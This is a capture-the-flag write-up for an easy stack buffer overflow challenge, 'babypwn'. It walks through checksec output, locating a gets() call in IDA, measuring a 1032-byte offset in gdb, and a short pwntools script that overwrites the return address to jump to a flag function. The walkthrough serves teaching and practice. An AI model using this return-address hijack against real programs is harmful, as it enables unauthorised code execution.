# babypwn.py
## About the challenge
This chall is an easy bufferoverflow.
When we execute the binary the output is a question and when we reply our answer is reflected:
```
How is the weather today? : aaa
aaa 
```

##Getting info about the chall
The first thing to do is to check the architecture of the executable and the active mitigations.
We can do this with the checksec command:
```
$checksec babypwn

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```
We can notice that we haven't mitigation active.
If you know nothing about these mitigations you can get an idea here: https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/.
Now we can disassemble it with ida pro:

This is the main, where we can find a vulnerable gets function:

![Screenshot of the binary disassembled with IDA Pro](Screenshots/main.jpg)

If we check the other function that we have in .text section we can notice that there are two intresting functions:

![list of functions](Screenshots/functions.jpg)

If we look under the hood we can see that flag1 is a useless function:

![surce of flag1](Screenshots/flag1.jpg)

flag2 is the real target:

![surce of flag2](Screenshots/flag2.jpg)

##Exploitation
At this point the POC is really easy, we have to exploit the overflow to overwrite the return address and redirect the execution to flag2.
To know after how many characters we need to overflow, we can use gdb and calculate the offset between the address in which we start to write and the address in which the return address is stored.
In practice we can do that by put a breakpoint at the gets function and take its destination address; after that with a breakpoint at the return instruction we can take the address of the return address; at this point we just need to make a subtraction between the two addresses:

![gdb gets](Screenshots/gets.jpg)

![gdb ret](Screenshots/ret.jpg)

``` 
>>> 0x7fffffffddb8-0x7fffffffd9b0
1032
```

Now we have all we need to write the exploit:
we have to cover the offset, overwrite the return address and that's it.

```
from pwn import*
conn = process("./babypwn")
addr_flag2=0x400649
conn.send("a"*1032+p64(addr_flag2))
conn.interactive()
```
